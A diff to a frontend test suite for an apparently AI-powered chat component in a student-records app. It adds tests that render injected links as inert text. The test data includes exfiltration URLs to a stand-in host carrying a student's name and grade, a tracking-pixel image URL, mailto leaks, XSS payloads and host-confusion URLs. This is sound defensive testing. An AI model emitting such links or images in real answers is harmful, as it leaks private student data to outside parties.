@@ -82,14 +82,57 @@ describe('Chat', () => {
     expect(screen.getByText('partial')).toBeInTheDocument();
   });
 
-  it('opens external links safely and does not render raw HTML', async () => {
+  it('keeps same-origin links and does not render raw HTML', async () => {
     const { ws } = await ask();
-    ws.emit({ type: 'delta', text: '[docs](https://example.com) <img src=x onerror=alert(1)> [bad](javascript:alert(1))' });
+    ws.emit({ type: 'delta', text: `[docs](${window.location.origin}/students/student-1) <img src=x onerror=alert(1)> [bad](javascript:alert(1))` });
     const a = screen.getByRole('link', { name: 'docs' });
     expect(a).toHaveAttribute('target', '_blank');
     expect(a.getAttribute('rel')).toMatch(/noopener/);
     expect(document.querySelector('img')).toBeNull();
     expect(screen.queryByRole('link', { name: 'bad' })).toBeNull();
+  });
+
+  it.each([
+    'https://evil.example/?student=Ben&grade=42',
+    'http://evil.example/collect',
+    '//evil.example/collect',
+    'mailto:attacker@evil.example?body=Ben%20grade%2042',
+    'javascript:alert(1)',
+    'data:text/html,leak',
+    `${window.location.protocol}//${window.location.hostname}.evil.example/collect`,
+    `${window.location.protocol}//${window.location.host}@evil.example/collect`,
+    `${window.location.protocol}//attacker:secret@${window.location.host}/students/student-1`,
+    `${window.location.protocol === 'http:' ? 'https:' : 'http:'}//${window.location.host}/students/student-1`,
+  ])('renders an injected destination as text: %s', async (destination) => {
+    const { ws } = await ask('Summarize Ben without sharing his records externally');
+    ws.emit({ type: 'delta', text: `Ben scored 42%. [View the supporting record](${destination})` });
+    expect(screen.getByText('View the supporting record')).toBeInTheDocument();
+    expect(screen.queryByRole('link', { name: 'View the supporting record' })).toBeNull();
+  });
+
+  it.each([
+    '/students/student-1',
+    './students/student-1',
+    '#attendance',
+    `${window.location.origin}/students/student-1?section=class-1#scores`,
+    `//${window.location.host}/students/student-1`,
+  ])('allows a same-origin record destination: %s', async (destination) => {
+    const { ws } = await ask();
+    ws.emit({ type: 'delta', text: `[Supporting record](${destination})` });
+    const link = screen.getByRole('link', { name: 'Supporting record' });
+    expect(link).toHaveAttribute('href', new URL(destination, window.location.href).href);
+    expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
+  });
+
+  it('applies the link boundary to restored history and image destinations', () => {
+    sessionStorage.setItem('st-chat', JSON.stringify([
+      { role: 'assistant', text: '[Saved answer](https://evil.example/?grade=42) ![Chart](https://evil.example/pixel?grade=42)' },
+    ]));
+    render(<Chat onClose={() => {}} />);
+    expect(screen.getByText('Saved answer')).toBeInTheDocument();
+    expect(screen.queryByRole('link', { name: 'Saved answer' })).toBeNull();
+    expect(screen.getByText('Chart')).toBeInTheDocument();
+    expect(document.querySelector('img')).toBeNull();
   });
 
   it('persists history per tab in sessionStorage and restores it', async () => {
